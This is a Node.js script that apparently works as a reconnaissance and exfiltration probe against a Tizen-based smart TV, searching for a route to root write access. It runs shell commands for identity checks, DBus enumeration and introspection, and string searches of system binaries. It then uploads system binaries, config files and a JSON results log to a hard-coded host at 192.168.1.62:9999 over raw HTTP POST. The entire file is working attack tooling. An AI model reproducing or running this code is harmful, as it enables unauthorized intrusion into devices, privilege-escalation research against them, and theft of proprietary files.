"use strict";
/* p42: root-write route discovery
   1. exfil binaries: wasutility, app-context-db-checker, tvctx-manager, wascmd, was, litewas
   2. exfil /etc/tvctx-manager/* + /etc/app-context-manager/* (configs, launcher, seed listing)
   3. full DBus: ListNames (complete) + introspect tvctx-manager object tree
   4. id + /tmp writability
   exfil /p42info + raw files
*/
var fs = null, cp = null, net = null, crypto = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}
try { crypto = require('crypto'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p42', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(90000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 240000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFile(p, name) {
  try {
    var b = fs.readFileSync(p);
    R.results['exfil_' + name] = b.length + 'B';
    postBuf('/bin_' + name, b);
  } catch (e) { R.results['exfil_' + name] = 'ERR ' + String(e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p42info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'identity', fn: function () { return run('id; echo ---; ls -la /tmp/.p42test 2>/dev/null; touch /tmp/.p42test && echo TMP_WRITABLE && rm /tmp/.p42test', 10000); }},
  { name: 'etc_tvctx_ls', fn: function () {
      return run('ls -la /etc/tvctx-manager/ 2>&1; echo ===; ls -la /etc/app-context-manager/ 2>&1; echo ===; ls -la /etc/tvctx-manager/appctx-config.json 2>&1', 15000);
  }},
  { name: 'appctx_config_json', fn: function () {
      return run('cat /etc/tvctx-manager/appctx-config.json 2>&1; echo ===LAUNCH; cat /etc/tvctx-manager/launch_tvctx_manager.sh 2>&1; echo ===LAUNCHER; cat /etc/tvctx-manager/launcher 2>&1 | head -40', 15000);
  }},
  { name: 'seed_state', fn: function () {
      return run('ls -la /etc/tvctx-manager/.app-context.db 2>&1; stat /etc/tvctx-manager/.app-context.db 2>&1 | head -6', 15000);
  }},
  { name: 'dbus_listnames_full', fn: function () {
      return run('dbus-send --system --print-reply --dest=org.freedesktop.DBus:/org/freedesktop/DBus org.freedesktop.DBus.ListNames 2>&1 | grep -E "string|name" | grep -vE "^ +array|method|serial|reply|sender|^\s*\]|^\s*\[" | grep "string" | sed "s/^\s*string \"//; s/\"$//" | sort -u', 30000);
  }},
  { name: 'dbus_introspect_acm', fn: function () {
      return run('for n in org.tizen.tvctx.manager org.tizen.ApplicationContextManager org.tizen.applicationcontext org.tizen.tv.appcontext org.tizen.manager.appctx com.samsung.tv.appctx org.tizen.appcontext.manager; do echo "== $n"; dbus-send --system --print-reply --dest=$n:/ org.freedesktop.DBus.Introspectable.Introspect 2>&1 | head -100; done', 45000);
  }},
  { name: 'checker_strings_hint', fn: function () {
      return run('grep -a -o -E "[A-Za-z_.-]{4,60}" /usr/bin/app-context-db-checker 2>/dev/null | sort -u | grep -iE "journal|seed|restore|initdb|recover|check|dbspace|app-context|corrupt|recovery|wal|hot|repl|config|launcher" | head -80', 30000);
  }},
  { name: 'wascmd_error_codes', fn: function () {
      return run('grep -a -o -E "WAS_ERR_[A-Z_]{2,40}" /usr/bin/wascmd /usr/lib/libwas_api.so /usr/lib/libwas_manager_api.so /usr/lib/libwas_util_api.so /usr/lib/libwebappservice.so 2>/dev/null | sort -u | head -100', 30000);
  }},
  { name: 'libappctx_find', fn: function () {
      return run('find /usr -name "libapp-context*" -o -name "*appctx*" -o -name "*app-context*" 2>/dev/null | head -20', 30000);
  }},
  { name: 'exfil_binaries', fn: function () {
      postFile('/usr/bin/wasutility', 'wasutility');
      postFile('/usr/bin/app-context-db-checker', 'appctxdbchecker');
      postFile('/usr/bin/tvctx-manager', 'tvctx-manager');
      postFile('/usr/bin/wascmd', 'wascmd');
      postFile('/usr/bin/was', 'was');
      postFile('/usr/bin/litewas', 'litewas');
      postFile('/etc/tvctx-manager/appctx-config.json', 'appctx-config.json');
      postFile('/etc/tvctx-manager/launch_tvctx_manager.sh', 'launch_tvctx_manager.sh');
      postFile('/etc/tvctx-manager/launcher', 'tvctx-launcher');
      return new Promise(function (resolve) { setTimeout(function () { resolve('exfil done'); }, 30000); });
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 240000);
